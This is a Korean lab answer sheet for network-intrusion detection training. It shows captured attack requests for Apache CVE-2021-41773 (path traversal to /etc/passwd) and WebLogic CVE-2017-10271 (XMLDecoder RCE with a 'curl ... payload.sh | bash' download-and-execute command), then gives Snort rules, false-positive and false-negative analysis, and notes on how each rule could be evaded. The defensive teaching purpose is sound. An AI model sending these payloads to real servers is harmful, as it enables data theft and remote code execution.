# 📌 실습 파일(답안 예시)

### 1) CVE-2021-41773.pcap

### **2) CVE-2017-10271.pcap**

---

# 1️⃣ CVE-2021-41773 – Apache Path Traversal로 /etc/passwd 탈취

```http
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: web-portal01.intra-sec.local
User-Agent: CorpHealthCheck/2.1 (IT-OPS)
X-Forwarded-For: 203.0.113.45
Accept: */*
Connection: close
```

✔ 내부정보

- **Host: `web-portal01.intra-sec.local`**
   → 내부 인트라넷 포털 서버로 위장
- **User-Agent: `CorpHealthCheck/2.1`**
   → 내부 점검/헬스체크 도구인 것처럼 보이게 속임
- **X-Forwarded-For**
   → 외부 공격자의 IP

## 🔹 Snort 룰 (CVE-2021-41773 탐지용)

```snort
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"WEB-ATTACK Apache CVE-2021-41773 path traversal to /etc/passwd via cgi-bin";
    flow:to_server,established;

    http_method; content:"GET"; nocase;

    // 1) 취약한 cgi-bin 경로
    http_uri; content:"/cgi-bin/"; nocase;

    // 2) 디렉터리 탈출 시도 (다양한 ../ 인코딩 허용)
    http_uri; pcre:"/(?:\.%2e|%2e%2e|\.{2})\/(?:\.%2e|%2e%2e|\.{2})\/(?:\.%2e|%2e%2e|\.{2})\//Ui";

    // 3) /etc/passwd 파일 접근
    http_uri; content:"/etc/passwd"; nocase;

    reference:cve,2021-41773;
    classtype:web-application-attack;
    sid:5004101; rev:1;
)
```

### 🔥 설명

- **`/cgi-bin/`**
   → 취약 CGI 스크립트가 걸려 있는 디렉터리.
- **`pcre` 부분**
   → `../`, `.%2e/`, `%2e%2e/` 등 여러 형태의 디렉터리 탈출을 한 번에 탐지.
  - 세 번 연속 상위 디렉터리 이동을 요구 → 과도한 FP 방지.
- **`/etc/passwd`**
   → 대표적인 로컬 파일 노출 시도(리눅스 계정 정보).

### 🎯 우회 난이도

- **FP(오탐)**
  - 정상 서비스에서 `/cgi-bin/` 아래에서 저런 삼중 상위 디렉터리 + `/etc/passwd`를 요청할 일은 거의 없음 → FP 매우 낮음.
- **FN(미탐)**
  - 공격자가 `/etc/passwd` 대신 `/etc/shadow`, `/var/www/html/config.php` 등 다른 파일을 노리면 미탐 가능.
  - `/icons/` 같은 다른 Alias를 쓰는 변형 PoC도 이 룰만으로는 못 잡을 수 있음.
- **우회 난이도: 중**
  - 단순 인코딩을 바꿔도 pcre가 잡도록 되어 있어서,
     **“다른 파일로 바꾸거나 `/cgi-bin/`이 아닌 alias를 쓰는 변형”**까지 해야 우회 가능.



------

# 2️⃣ CVE-2017-10271 – WebLogic wls-wsat RCE (XMLDecoder 기반 RCE)

```http
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: was-prd01.intra-sec.local
User-Agent: CorpDeployClient/5.0 (build-agent)
Content-Type: text/xml
Content-Length: 742
X-Forwarded-For: 198.51.100.23
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>curl http://files-gw01.intra-sec.local/payload.sh | bash</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

✔ 내부정보

- **Host: `was-prd01.intra-sec.local`**
   → 내부 WebLogic WAS 1번 노드.
- **User-Agent: `CorpDeployClient/5.0`**
   → 내부 배포 자동화 에이전트인 것처럼 위장.
- **Body**에서
  - `<work:WorkContext>` + `java.beans.XMLDecoder` + `ProcessBuilder`
  - 명령은 **내부 파일게이트웨이 `files-gw01.intra-sec.local` 에서 스크립트 받아 실행**.

------

## 🔹 Snort 룰 (CVE-2017-10271 wls-wsat RCE 탐지)

```snort
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"WEB-ATTACK Oracle WebLogic CVE-2017-10271 wls-wsat XMLDecoder RCE attempt";
    flow:to_server,established;

    // 1) 대상 URI: 취약한 WebLogic 서비스 경로
    http_uri; content:"/wls-wsat/CoordinatorPortType"; nocase;

    // 2) SOAP WorkContext + XMLDecoder 사용
    http_client_body; content:"<work:WorkContext"; nocase;
    http_client_body; content:"java.beans.XMLDecoder"; nocase;

    // 3) 프로세스 실행 시도 (ProcessBuilder)
    http_client_body; content:"java.lang.ProcessBuilder"; nocase;

    classtype:web-application-attack;
    reference:cve,2017-10271;
    sid:5004102; rev:1;
)
```

### 🔥 설명

- **URI `/wls-wsat/CoordinatorPortType`**
   → 취약한 WebLogic 서비스 엔드포인트.
- **`<work:WorkContext` + `java.beans.XMLDecoder`**
   → CVE-2017-10271 PoC의 대표적인 패턴. XMLDecoder를 이용해 임의 자바 객체 생성.
- **`java.lang.ProcessBuilder`**
   → 서버에서 시스템 명령 실행을 위해 자주 쓰이는 클래스.

### 🎯 우회 난이도

- **FP(오탐)**
  - 정상 WebLogic 트래픽 중에서
     `WorkContext + XMLDecoder + ProcessBuilder`가 동시에 들어갈 가능성은 거의 없으므로 FP 낮음.
- **FN(미탐)**
  - 공격자가
    - 다른 취약 엔드포인트(`/wls-wsat/RegistrationService` 등)를 사용하거나
    - XMLDecoder는 그대로 두고 다른 RCE용 클래스(예: `Runtime.getRuntime().exec`) 조합을 쓸 경우 이 룰만으로는 미탐 가능.
- **우회 난이도: 중~상**
  - **핵심 TTP(WorkContext + XMLDecoder 기반 RCE)를 버리지 않는 한** 우회 어렵고,
  - 실습에서 “`ProcessBuilder` 대신 다른 실행 방법으로 바꾸면 탐지되나?”를 토론하기 좋음.